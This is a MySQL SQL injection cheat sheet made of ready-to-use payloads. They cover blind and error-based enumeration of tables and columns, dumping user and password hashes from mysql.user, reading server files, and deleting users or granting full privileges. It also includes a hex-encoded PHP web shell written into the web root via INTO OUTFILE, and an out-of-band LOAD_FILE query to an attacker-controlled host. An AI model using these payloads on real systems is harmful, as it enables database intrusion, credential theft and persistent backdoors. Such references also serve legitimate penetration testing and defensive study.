# SQL Injection Cheat Sheet MySQL  :syringe:

Inspired by
[SQL-Injection-Cheat-Sheet-MySQL](https://blog.safebuff.com/2016/04/11/SQL-Injection-Cheat-Sheet-MySQL/) and 
[SecurityIdiots](http://www.securityidiots.com/Web-Pentest/SQL-Injection/)


[Advanced](https://github.com/0xC2-0xC2/Pentest-notes-1/blob/master/SQL_injection.txt)

by: Eduardo Barbosa (@Anake)  :alien::smiling_imp::boom: 


- [SQL Injection Cheat Sheet MySQL](#SQL-Injection-Cheat-Sheet-MySQL)
    - [Comments](#Comments)
    - [Version](#Version)
    - [User details](#User-details)
    - [Database details](#Database-details)
    - [Database credentials](#Database-credentials)
    - [Server details](#Server-details)
    - [Table Name](#Table-Name)
    - [Find Tables From Column Name](#Find-Tables-From-Column-Name)
    - [Columns Names](#Columns-Names)
    - [Bitwise AND](#Bitwise-AND)
    - [No Quotes](#No-Quotes)
    - [String Concatenation](#String-Concatenation)
    - [If Statement](#If-Statement)
    - [Avoiding Quotes](#Avoiding-Quotes)
    - [Case Statement](#Case-Statement)
    - [Conditionals](#Conditionals)
    - [Time-delay](#Time-delay)
    - [Command Execution](#Command-Execution)
    - [RunAs](#RunAs)
    - [Read Files](#Read-Files)
    - [Outfile Files to www](#Outfile-Files-to-www)
    - [Out-of-Band Retrieval](#Out-of-Band-Retrieval)
    - [Substrings](#Substrings)
    - [Retrieve Nth Line](#Retrieve-Nth-Line)
    - [Select Nth Row](#Select-Nth-Row)
    - [List Privileges](#List-Privileges)
    - [List DBA Accounts](#List-DBA-Accounts)
    - [Delete Users](#Delete-Users)
    - [Make User DBA](#Make-User-DBA)
    
    
## SQL Injection Cheat Sheet MySQL

### Comments

```
--	 #	MySQL Linux Style            
--+      #	MySQL Windows Style          
#	 #	Hash (URL encode while use)  
--+-	 #	SQL Comment                  
;%00	 #	Null Byte                    
`        #      Backtick   
/*
```

### Version

```
SELECT VERSION();
SELECT @@VERSION;
SELECT @@GLOBAL.VERSION;
```

### User details

```
SELECT user()
SELECT current_user()
SELECT current_user
SELECT system_user()
SELECT session_user()
SELECT user,password FROM mysql.user;   # list Users
```

### Database details

```
SELECT db_name();
SELECT database();
SELECT schema_name FROM information_schema.schemata;
```

### Database credentials

```
SELECT host, user, password FROM mysql.user;
```

### Server details

```
SELECT @@hostname;
```

### Table Name

```
SELECT table_name FROM information_schema.tables;
SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema';
SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10; #all tables
AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'; #Blind
and 0<(select count(*) from xxx) and 1<2    #盲注爆表

AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2)))
(@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0);
AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));-- Available in 5.1.5
```

### Find Tables From Column Name

```
SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = 'columnname';#find table which have a column called 'columnname'
and 0<(select count(xxx) from tbl_user) and 1<2 ＃盲注爆字段
```

### Columns Names

```
SELECT column_name FROM information_schema.columns WHERE table_name = 'tablename';
SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema';
```

### Bitwise AND

```
SELECT 6 & 2; # returns 2
SELECT 6 & 1; # returns 0
```

### No Quotes 

```
CONCAT(CHAR(97), CHAR(98), CHAR(99))
```

### String Concatenation

```
CONCAT(foo, bar)
```

### If Statement

```
SELECT if(1=1,'foo','bar'); -- returns 'foo'
```

### Avoiding Quotes

```
SELECT 0×414243; # returns ABC
```
### Case Statement

```
SELECT CASE WHEN (1=1) THEN 'A' ELSE 'B' END; # returns A
```

### Conditionals

```
SELECT IF(1=1,'true','false');
```

### Time-delay

```
SELECT BENCHMARK(1000000,MD5(‘A’));
SELECT SLEEP(5); # >= 5.0.12
```

### Command Execution

```
http://dev.mysql.com/doc/refman/5.1/en/adding-udf.html
```

### RunAs

```
N/A
```

### Read Files

```
SELECT LOAD_FILE('C:Windowswin.ini');
```

### Outfile Files to www

```
select 0x3C3F706870206576616C28245F504F53545B7A5D293B3F3E into outfile '/usr/local/var/www/webshell.php' # <?php eval($_POST[z]);?>"
```

### Out-of-Band Retrieval

```
SELECT LOAD_FILE(concat('\\',(SELECT 1), 'attacker.controlledserver.com\')));
```

### Substrings

```
SELECT substr('Foobr', 1, 1);
```

### Retrieve Nth Line

```
SELECT * FROM table ORDER BY ID LIMIT 3,1
````

### Select Nth Row

```
SELECT column_name FROM information_schema.columns WHERE table_name = 'tablename' limit 1 offset 1    #bypass limit 1,1
SELECT column_name FROM information_schema.columns WHERE table_name = 'tablename' limit 1 offset 2
```

### List Privileges

```
SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges;

list user privsSELECT host, user, Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv, Reload_priv, Shutdown_priv, Process_priv, File_priv, Grant_priv, References_priv, Index_priv, Alter_priv, Show_db_priv, Super_priv, Create_tmp_table_priv, Lock_tables_priv, Execute_priv, Repl_slave_priv, Repl_client_priv FROM mysql.user;
   
priv, list user privsSELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges;
    
list privs on databases (schemas)SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges;
    
list privs on columns
```

### List DBA Accounts

```
SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'SUPER';
SELECT host, user FROM mysql.user WHERE Super_priv = 'Y'; # priv

```

### Delete Users

```
DROP USER test1;
```

### Make User DBA

```
GRANT ALL PRIVILEGES ON *.* TO test@'%';
```
